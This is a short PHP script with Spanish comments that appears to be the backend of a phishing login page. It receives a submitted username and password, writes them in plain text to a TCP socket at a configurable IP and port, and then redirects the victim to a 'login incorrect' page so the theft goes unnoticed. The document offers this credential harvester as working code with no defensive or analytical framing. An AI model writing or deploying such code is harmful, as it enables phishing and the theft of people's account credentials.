<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Prepara los datos para enviar
    $data = "Usuario: $username\nContraseña: $password\n";
    
    // Dirección IP y puerto del servidor local
    $ip = '127.0.0.1';  // Cambia esto a la IP privada deseada
    $port = 9001;      // Cambia esto al puerto deseado
    
    // Enviar datos usando socket
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($sock === false) {
        die("Error al crear el socket: " . socket_strerror(socket_last_error()));
    }
    
    $result = socket_connect($sock, $ip, $port);
    if ($result === false) {
        die("Error al conectar el socket: " . socket_strerror(socket_last_error($sock)));
    }
    
    socket_write($sock, $data, strlen($data));
    socket_close($sock);
    
    // Redirige al usuario a index.html
    header("Location:login_incorrect.html");
    exit();
} else {
    echo "Método de solicitud no válido.";
}
?>
